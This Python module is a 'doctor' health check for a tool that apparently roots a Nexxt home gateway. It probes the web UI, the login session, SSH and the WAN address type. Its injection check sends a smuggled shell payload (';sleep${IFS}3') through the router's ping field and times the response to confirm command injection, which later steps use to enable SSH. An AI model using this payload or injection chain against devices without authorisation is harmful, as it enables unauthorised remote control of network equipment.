"""End-to-end health check ('doctor'): tells you exactly what is missing."""

from __future__ import annotations

import ipaddress

from . import probe as probe_mod
from .client import NexxtClient, SessionExpired
from .inject import Injector, I, run_ping
from .ssh import status as ssh_status, ssh_run, host_of
from .wanwatch import classify_v4

PASS, FAIL, SKIP = "PASS", "FAIL", "SKIP"


def _wan_class(ip: str) -> str:
    try:
        return classify_v4(ip)
    except ValueError:
        return "unknown"


def run_doctor(base_url: str, port: int, key: str | None = None,
               check_injection: bool = True, log=print) -> tuple[list[dict], int]:
    """Returns (stages, exit_code). exit 0 = all critical stages pass."""
    stages: list[dict] = []

    def stage(name: str, status: str, detail: str = "", hint: str = "") -> None:
        stages.append({"stage": name, "status": status, "detail": detail, "hint": hint})
        mark = {"PASS": "✓", "FAIL": "✗", "SKIP": "-"}[status]
        log(f"[{mark}] {name}: {status} {detail}" + (f"  → {hint}" if hint else ""))

    # 1. unauthenticated probe
    try:
        report = probe_mod.run_probe(base_url)
        sig = report["analysis"]["compatibility_signal"]
        if sig == "strong-front-end-match":
            stage("web-ui-compatibility", PASS, sig)
        else:
            stage("web-ui-compatibility", FAIL, sig,
                  "firmware may differ; injection steps are guarded, see docs")
    except Exception as exc:
        stage("web-ui-compatibility", FAIL, str(exc), "check gateway URL / LAN connectivity")
        return stages, 1

    # 2. session
    client = NexxtClient(base_url)
    authed = client.is_authenticated()
    if authed:
        stage("web-session", PASS)
    else:
        stage("web-session", SKIP, "no valid session",
              "nexxt session login  (or import-cookie) — needed only for bootstrap/verify")

    # 3. injection (only if authed)
    if authed and check_injection:
        try:
            inj = Injector(client)
            base, _ = run_ping(client, "127.0.0.1")
            e, _ = run_ping(client, f":::::::;sleep${{IFS}}3")
            if e > base + 1.5:
                stage("command-injection", PASS, f"baseline {base:.1f}s, probe {e:.1f}s")
            else:
                stage("command-injection", FAIL, f"baseline {base:.1f}s, probe {e:.1f}s",
                      "injection not effective on this firmware")
        except SessionExpired:
            stage("command-injection", SKIP, "session lost")
        except Exception as exc:
            stage("command-injection", FAIL, str(exc))
    else:
        stage("command-injection", SKIP, "needs session")

    # 4. SSH service (via oracle if authed, or real SSH if key given)
    if key:
        proc = ssh_run(host_of(base_url), port, key, "echo OK")
        if "OK" in proc.stdout:
            stage("ssh-service", PASS, f"port {port} reachable with key")
        else:
            stage("ssh-service", FAIL, proc.stderr.strip().splitlines()[-1] if proc.stderr else "failed",
                  "nexxt ssh bootstrap --pubkey <rsa.pub>")
    elif authed:
        try:
            inj = Injector(client, force=True)
            st = ssh_status(inj, port)
            ok = st["listening"] and st["uci_instance"] and st["authorized_keys"]
            stage("ssh-service", PASS if ok else FAIL, str(st),
                  "" if ok else "nexxt ssh bootstrap --pubkey <rsa.pub>")
        except Exception as exc:
            stage("ssh-service", FAIL, str(exc))
    else:
        stage("ssh-service", SKIP, "needs session or --key")

    # 5. WAN IPv4 class
    wan_class = None
    if key:
        proc = ssh_run(host_of(base_url), port, key,
                       "ip -4 addr show dev veip0_1 | grep 'inet '")
        import re
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", proc.stdout)
        if m:
            wan_class = _wan_class(m.group(1))
    elif authed:
        try:
            _, data = client.get("wanstatusinfo")
            wan_ip = data.get("wanstatusinfo", {}).get("wan_ip", "")
            if wan_ip:
                wan_class = _wan_class(wan_ip)
        except Exception:
            pass
    if wan_class:
        ok = wan_class == "PUBLIC"
        stage("wan-public-ipv4", PASS if ok else FAIL, wan_class,
              "" if ok else "inbound blocked at ISP (CGNAT); see docs/fastweb-notes.md")
    else:
        stage("wan-public-ipv4", SKIP, "needs session or --key")

    critical = [s for s in stages if s["stage"] in
                ("web-ui-compatibility", "command-injection", "ssh-service")]
    exit_code = 0 if all(s["status"] in (PASS, SKIP) for s in critical) else 1
    return stages, exit_code
